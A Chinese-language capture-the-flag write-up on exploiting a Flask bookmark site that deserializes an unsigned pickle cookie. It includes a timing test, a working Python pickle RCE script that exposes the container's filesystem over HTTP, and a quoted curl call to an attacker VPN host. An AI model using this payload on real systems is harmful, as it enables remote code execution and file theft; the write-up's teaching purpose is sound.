## 题解

### 入口与指纹

Flask 书签站：`/`（302 → `/list`）、`/add`、`/list`、`/about`。
首次访问 `/list` 会下发两个 cookie：`user=<32 hex>`、`bookmarks=gARdlC4=`（base64 pickle）。

### 关键观察

**1. `bookmarks` 是 **未签名** 的 pickle，服务端会反序列化它。**

`gARdlC4=` 解出来是 `b'\x80\x04]\x94.'`，即 `pickle.dumps([])`。

**2. 反序列化只在「同时带上有效的 `user` cookie」时发生。**

| 请求 | 结果 |
| --- | --- |
| 只带 `bookmarks=<恶意 pickle>` | 0.13s，正常 `/list` |
| 带 `user=<有效 token>` + `bookmarks=<恶意 pickle>` | **3.1s**（`os.system('sleep 3')` 生效）然后 500 |

500 是因为反序列化出来的对象不是 `[{name,url}]` 结构，但不影响命令已经执行。

**3. 容器不能出网，但端口对 VPN 开放。**

`os.system('curl http://<vpn-ip>:8899/...')` 会挂住（`Network is unreachable`），
但用 RCE 在容器里 `python3 -m http.server 8899 --directory /` 起个静态服务后，
从 VPN 直接访问 `<container_ip>:8899/flag.txt` 就能读到文件。

### 利用链

```bash
T=$(head -1 .target)          # IP
python3 - "$T" <<'PY'
import base64, pickle, os, sys, time, requests
T = f"http://{sys.argv[1]}"
class E:
    def __reduce__(self):
        return (os.system, ("setsid python3 -m http.server 8899 --directory / >/dev/null 2>&1 &",))
payload = base64.urlsafe_b64encode(pickle.dumps(E())).decode()
s = requests.Session(); s.trust_env = False
s.get(T + "/list")                       # 拿 user cookie
user = s.cookies.get("user")
requests.get(T + "/list", cookies={"user": user, "bookmarks": payload}, timeout=15)
time.sleep(2)
print(requests.get(f"http://{sys.argv[1]}:8899/flag.txt").text)
PY
```

### flag 位置

容器内 `/flag.txt`，通过自建的 8899 静态服务读出。

## 复盘

- **先分辨「客户端 cookie 是数据还是签名令牌」。** base64 里以 `\x80\x04` 开头就是 pickle；
  再判断服务端是否真的 `pickle.loads`——用 `sleep` 测耗时最稳（0.13s vs 3.1s）。
- **`user` cookie 是执行前提。** 全新 `/list` 会同时给你 `user` 和 `bookmarks`，
  保留 `user`、只替换 `bookmarks` 就能触发。
- **不出网时用「自己起服务」代替反弹。** `python3 -m http.server --directory /`
  比写文件找 web 根目录更省事，端口也能从 VPN 直连。
